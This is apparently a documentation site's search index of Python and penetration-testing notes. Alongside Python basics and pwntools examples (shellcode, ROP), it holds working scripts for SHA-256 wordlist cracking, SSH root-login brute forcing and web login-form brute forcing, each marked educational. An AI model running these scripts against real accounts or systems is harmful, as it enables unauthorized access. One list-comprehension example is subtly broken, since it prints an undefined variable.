{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":""},{"location":"#the-documentation-is-a-dedicated-resource-for-capturing-and-organizing-knowledge-in-the-fields-of-penetration-testing-and-cybersecurity","title":"The Documentation is a dedicated resource for capturing and organizing knowledge in the fields of penetration testing and cybersecurity.","text":""},{"location":"#it-serves-as-a-living-archive-continually-evolving-with-fresh-insights-techniques-and-methodologies-as-they-are-learned-and-explored","title":"It serves as a living archive, continually evolving with fresh insights, techniques, and methodologies as they are learned and explored.","text":""},{"location":"Scripting/Python/Python%20101/","title":"Python 101","text":""},{"location":"Scripting/Python/Python%20101/#dictionaries","title":"Dictionaries","text":"Iterating over dictionaries<pre><code>dict1 = {\"a\": 1, \"b\": 2, \"c\": 3}\n\nfor key, value in dict1.items():\n  if value == 3:\n    print(key)\n</code></pre> Functions taking dictionaries as input<pre><code>def function7(**dict):\n  for key, value in dict.items():\n    print(key, value)\n\ndef function8(**ks):\n  for a in ks:\n    print(a, ks[a])\n\nfunction7(a=\"1\", b=\"2\", c=\"3\")\n# Output: a 1 b 2 c 3\n\nfunction8(a=\"1\", b=\"2\", c=\"3\")\n# Output: a 1 b 2 c 3\n</code></pre>"},{"location":"Scripting/Python/Python%20101/#comprehensions","title":"Comprehensions","text":"Basics<pre><code>list1 = ['a', 'b', 'c', 'd', 'e']\nlist2 = [x for x in list1]\nprint(list2)\n# Output: ['a', 'b', 'c', 'd', 'e']\n\nlist3 = [c for c in \"string\"]\nprint(list3)\n# Output: ['s', 't', 'r', 'i', 'n', 'g']\n\nprint(\"-\".join(list11))\n# Output: s-t-r-i-n-g\n</code></pre>"},{"location":"Scripting/Python/Python%20101/#files","title":"Files","text":"Basic file operations<pre><code># Iterate over lines\nwith open(\"test.txt\", encoding='latin-1') as f:\n  for line in f:\n    print(line)\n\n# Append to a file\nf = open(\"test.txt\", \"a\")\nf.write(\"test line two!\")\nf.close()\n</code></pre>"},{"location":"Scripting/Python/Python%20101/#lambdas","title":"Lambdas","text":"Potentially useful lambdas<pre><code>blocks = lambda x, y: [x[i:i + y] for i in range(0, len(x), y)]\nprint(blocks(\"string\", 2))\n# Output: [\"st\", \"ri\", \"ng\"]\n\nto_ord = lambda x: [ord(i) for i in x]\nprint(to_ord(\"ABCD\"))\n# Output: [65, 66, 67, 68]\n</code></pre> Arithmetic operations examples<pre><code>add_4 = lambda x: x + 4\nprint(add_4(2))\n# Output: 6\n\nadd = lambda x, y: x + y\nprint(add(2, 3))\n# Output: 5\n\nprint((lambda x, y: x + y)(10, 4))\n# Output 14\n\nis_even = lambda x: x % 2 == 0\nprint(is_even(2))\n# Output: True\n\nprint(is_even(3))\n# Output: False\n</code></pre>"},{"location":"Scripting/Python/Python%20Automation/Exploiting%20a%20Restricted%20SQL%20Injection/","title":"Exploiting a Restricted SQL Injection","text":"<p>Legal Disclaimer</p> <p>This script is for educational purposes only. Unauthorized use of this script against systems without explicit permission is illegal and unethical.</p>"},{"location":"Scripting/Python/Python%20Automation/Exploiting%20a%20SQL%20Injection/","title":"Exploiting a SQL Injection","text":"<p>Legal Disclaimer</p> <p>This script is for educational purposes only. Unauthorized use of this script against systems without explicit permission is illegal and unethical.</p>"},{"location":"Scripting/Python/Python%20Automation/SHA256%20Password%20Cracking/","title":"SHA256 Password Cracking","text":"<p>pwntools hashing documentation \ud83d\udd11</p> <p>This script uses the <code>pwntools</code> module to perform a SHA-256 password cracking attack.</p> <pre><code>from pwn import *\nimport sys\n\nif len(sys.argv) != 2:\n    print(\"Invalid arguments!\")\n    print(f\"&gt;&gt; {sys.argv[0]} &lt;sha256sum&gt;\")\n    exit()\n\nwanted_hash = sys.argv[1]\npassword_file = \"rockyou.txt\"\nattempts = 0\n\nwith log.progress(f\"Attempting to crack: {wanted_hash}!\\n\") as p:\n    with open(password_file, \"r\", encoding='latin-1') as password_list:\n        for password in password_list:\n            password = password.strip(\"\\n\").encode('latin-1')\n            password_hash = sha256sumhex(password)\n            p.status(f\"[{attempts}] {password.decode('latin-1')} == {password_hash}\")\n\n            if password_hash == wanted_hash:\n                p.success(f\"Password hash found after {attempts} attempts! {password.decode('latin-1')} hashes to {password_hash}!\")\n                exit()\n\n            attempts += 1\n\n        p.failure(\"Password hash not found\")\n</code></pre> <p>Legal Disclaimer</p> <p>This script is for educational purposes only. Unauthorized use of this script against systems without explicit permission is illegal and unethical.</p>"},{"location":"Scripting/Python/Python%20Automation/SSH%20Login%20Brute%20Forcing/","title":"SSH Login Brute Forcing","text":"<p>pwntools SSH documentation \ud83d\udca5</p> <p>This script uses the <code>pwntools</code> and <code>paramiko</code> modules to perform an SSH login brute-force attack. <pre><code>from pwn import *\nimport paramiko\n\nhost = \"127.0.0.1\"\nusername = \"root\"\nattempts = 0\n\nwith open(\"ssh-common-passwords.txt\", \"r\") as password_list:\n    for password in password_list:\n        password = password.strip(\"\\n\")\n\n        try:\n            print(f\"[{attempts}] Attempting password: '{password}'!\")\n            response = ssh(host=host, user=username, password=password, timeout=1)\n\n            if response.connected():\n                print(f\"[&gt;] Valid password found: '{password}'!\")\n                response.close()\n                break\n            response.close()\n        except paramiko.ssh_exception.AuthenticationException:\n            print(\"[x] Invalid password!\")\n        attempts += 1\n</code></pre></p> <p>Legal Disclaimer</p> <p>This script is for educational purposes only. Unauthorized use of this script against systems without explicit permission is illegal and unethical.</p>"},{"location":"Scripting/Python/Python%20Automation/Web%20Login%20Form%20Brute%20Forcing/","title":"Web Login Form Brute Forcing","text":"<p>requests module \ud83c\udf10</p> <p>This script uses the <code>requests</code> module to perform a web login form brute-force attack.</p> <pre><code>import requests\nimport sys\n\ntarget = \"http://127.0.0.1:5000\"\nusernames = [\"admin\", \"user\", \"test\"]\npasswords = \"top-100.txt\"\nneedle = \"Welcome back\"\n\nfor username in usernames:\n    with open(passwords, \"r\") as passwords_list:\n        for password in passwords_list:\n            password = password.strip(\"\\n\").encode('latin-1')\n            sys.stdout.write(f\"[X] Attempting user:password -&gt; {username}:{password.decode('latin-1')}\\r\")\n            sys.stdout.flush()\n\n            r = requests.post(target, data={\"username\": username, \"password\": password})\n\n            if needle.encode() in r.content:\n                sys.stdout.write(\"\\n\")\n                sys.stdout.write(f\"\\t[&gt;&gt;&gt;&gt;&gt;] Valid password '{password}' found for user '{username}'!\")\n                sys.exit()\n\n        sys.stdout.flush()\n        sys.stdout.write(\"\\n\")\n        sys.stdout.write(f\"\\t No password found for '{username}'!\")\n        sys.stdout.write(\"\\n\")\n</code></pre> <p>Legal Disclaimer</p> <p>This script is for educational purposes only. Unauthorized use of this script against systems without explicit permission is illegal and unethical.</p>"},{"location":"Scripting/Python/Python%20Modules/Managing%20Modules/","title":"Managing Modules","text":""},{"location":"Scripting/Python/Python%20Modules/Managing%20Modules/#package-manager","title":"Package manager","text":"List Python modules<pre><code>pip list\npip freeze\n</code></pre> Install specific module &amp; version<pre><code>pip install pwntools==4.5.1\n</code></pre> Install required modules<pre><code>pip install -r requirements.txt\n</code></pre>"},{"location":"Scripting/Python/Python%20Modules/Managing%20Modules/#virtual-environments","title":"Virtual environments","text":"Preparation<pre><code>pip install virtualenv\nmkdir virtual &amp;&amp; cd virtual\npython3 -m venv env\nsource env/bin/activate\n</code></pre>"},{"location":"Scripting/Python/Python%20Modules/Useful%20Modules/","title":"Useful Modules","text":""},{"location":"Scripting/Python/Python%20Modules/Useful%20Modules/#sys","title":"sys","text":"<p>Official documentation</p> Get info<pre><code>import sys\nprint(sys.version)\nprint(sys.executable) # Currently used Python binary\nprint(sys.platform)   # Currently used platform\nprint(sys.path)       # Packages path\nprint(sys.modules)    # Available modules\n</code></pre> Process input from standard input<pre><code>for line in sys.stdin:\n    if line.strip() == \"exit\":\n        break\n    sys.stdout.write(f\"&gt;&gt; {line}\")\n</code></pre> Print directly from standard output - in one line<pre><code>for i in range(1,5):\n    sys.stdout.write(str(i))\n    sys.stdout.flush()\n    # Output: 1234\n</code></pre> Loading bar using stdout<pre><code>import time\n\nfor i in range(0, 51):\n    time.sleep(0.1)\n    sys.stdout.write(f\"{i} [{'#'*i}{'.'*(50-i)}]\\r\")\n    sys.stdout.flush()\nsys.stdout.write(\"\\n\")\n</code></pre> Control user provided arguments<pre><code>print(sys.argv)\n# Output: ['main.py']           - if ran without any arguments\n# Output: ['main.py', '1', '2'] - if ran like \"python main.py 1 2\" (1)\n\nif len(sys.argv) != 3:\n    print(f\"[X] To run {sys.argv[0]} enter a username and password!\")\n    sys.exit(5) # (2)\n\nusername = sys.argv[1]\npassword = sys.argv[2]\n\nprint(f\"{username} {password}\")\n\nsys.exit(0) # (3)\n</code></pre> <ol> <li>sys.argv arguments are automatically casted as strings in an array.</li> <li>Exit a script with a code of 5.</li> <li>Exit a script with a code of 0.</li> </ol> <p>Exit code verification</p> <p>To verify the exit code with which the program terminated, you can use the <code>echo $?</code> command in Bash.</p>"},{"location":"Scripting/Python/Python%20Modules/Useful%20Modules/#requests","title":"requests","text":"<p>Official documentation</p> Response data<pre><code>import requests\n\nx = requests.get('http://httpbin.org/get')\n\nprint(x.status_code)\nprint(x.headers) # Response headers\nprint(x.cookies) # Cookies returned by the server in response\nprint(x.text)    # Response text\nprint(x.json())  # Response as json\nprint(x.elapsed) # Time elapsed between request being sent and getting a response\n</code></pre> Sending different jazz<pre><code># Defining request arguments\nparams = {'id': 3}\nheaders = {'Accept': 'application/json', 'test_header': 'test'}\ncookies = {'a': 'b'}\n\nx = requests.get('http://httpbin.org/get', params=params, headers=headers, cookies=cookies)\n</code></pre> POST requests<pre><code># Sending POST body data\nx = requests.post('http://httpbin.org/post', data={'a':'b', 'c': 'd', 'e': 'f'})\n\n# Sending file\nfiles = {'file': open('test.txt', 'rb')}\nx = requests.post('http://httpbin.org/post', files=files)\n</code></pre> Misc operations<pre><code># Basic Auth\nx = requests.get('http://httpbin.org/get', auth=('username', 'password'))\n\n# Bypass invalid SSL cert\nx = requests.get('http://expired.badssl.com', verify=False)\n\n# Disallow redirects\nx = requests.get('http://github.com', allow_redirects=False)\n\n# Set a response timeout\nx = requests.get('http://httpbin.org/get', timeout=5)\nprint(x.content)\n\n# Save file to disk\nx = requests.get('https://www.google.com/images/branding/googlelogo/1x/googlelogo_light_color_272x92dp.png')\nwith open('google.png', 'wb') as f:\n    f.write(x.content)\n</code></pre> Sessions<pre><code>x = requests.Session()\nx.cookies.update({'a': 'b'})\nresponse = x.get('http://httpbin.org/cookies')\nprint(response.text)\n</code></pre>"},{"location":"Scripting/Python/Python%20Modules/Useful%20Modules/#pwntools","title":"pwntools","text":"<p>Official documentation</p> Pwntools examples<pre><code>from pwn import *\n\nprint(cyclic(50))\nprint(cyclic_find(\"laaa\"))\n\nprint(shellcraft.sh())\nprint(hexdump(asm(shellcraft.sh())))\n\n# Run process\np = process(\"/bin/sh\")\np.sendline(\"echo hello;\")\np.interactive()\n\n# Connect remotely\nr = remote(\"127.0.0.1\", 1234)\nr.sendline(\"hello!\")\nr.interactive\nr.close\n\n# Packing numbers\nprint(p32(0x13371337))\nprint(hex(u32(p32(0x13371337))))\n\n# Loading files\nl = ELF('/bin/bash')\n\nprint(hex(l.address))\nprint(hex(l.entry))\n\nprint(hex(l.got['write']))\nprint(hex(l.plt['write']))\n\nfor address in l.search(b'/bin/sh\\x00'):\n    print(hex(address))\n\nprint(hex(next(l.search(asm('jmp esp')))))\n\nr = ROP(l)\nprint(r.rbx)\n\n# Different operations\nprint(xor(xor(\"A\", \"B\"), \"A\"))\nprint(b64e(\"test\"))\nprint(b64d(\"dGVzdA==\"))\nprint(md5sumhex(b\"hello\"))\nprint(sha1sumhex(b\"hello\"))\n\nprint(bits(b'a'))\nprint(unbits([0,1,1,0,0,0,0,1]))\n</code></pre>"}]}